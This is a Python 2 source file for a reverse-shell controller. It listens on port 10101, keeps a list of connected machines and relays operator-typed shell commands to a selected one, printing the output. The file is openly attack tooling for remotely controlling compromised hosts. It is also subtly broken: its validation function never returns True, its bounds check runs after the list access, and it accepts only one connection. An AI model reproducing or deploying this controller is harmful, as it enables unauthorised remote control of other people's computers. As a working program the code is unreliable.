import socket
import threading


class Server(object):
    sckt = None
    addresses = []
    connections = []

    def __init__(self):
        self.sckt = socket.socket()
        self.sckt.bind(("", 10101))
        self.sckt.listen(5)

    def start(self):
        self.accept_connections()
        self.show_prompt()

    # should be multi-threaded
    def accept_connections(self):
        connection, address = self.sckt.accept()
        self.connections.append(connection)
        self.addresses.append(address)

    def show_prompt(self):
        while True:
            command = raw_input("\nreverse-shell> ")
            if command == "quit":
                break
            elif command == "list":
                self.show_connections()
            elif command[:6] == "select":
                valid = self.error_check_for_send_commands(command[7:])
                if valid:
                    self.send_commands(int(command[7:]))
            else:
                print("-- command not recognized")

    def remove_connection(self, index):
        del self.addresses[index]
        del self.connections[index]

    def show_connections(self):
        print("\n---------- Connections ----------")
        for index, address in enumerate(self.addresses):
            try:
                self.connections[index].send("?")
                self.connections[index].recv(1024)
            except:
                self.remove_connection(index)
                continue
            print(str(index) + (" " * 10) + address[0] + (" " * 10) + str(address[1]))

    def send_commands(self, index):
        while True:
            command = raw_input(self.addresses[index][0] + ">> ")
            if command == "done":
                break
            elif len(command) > 0:
                self.connections[index].send(command)
                response = str(self.connections[index].recv(1024))
                print(response)
        self.show_connections()

    def error_check_for_send_commands(self, argument):
        if not argument.isdigit():
            print("-- " + argument + " is not a number")
            return False
        index = int(argument)
        if self.connections[index] is None:
            print("-- connection " + str(index) + " is no longer available")
            print("-- use command 'list' to see all available connections")
            self.remove_connection(index)
            return False
        elif index >= len(self.connections):
            print("-- connection " + str(index) + " is not an active connection")
            print("-- use command 'list' to see all available connections")
            return False

    def close_connections(self):
        for connection in self.connections:
            connection.close()
        self.sckt.close()


def main():
    server = Server()
    server.start()


if __name__ == "__main__":
    main()
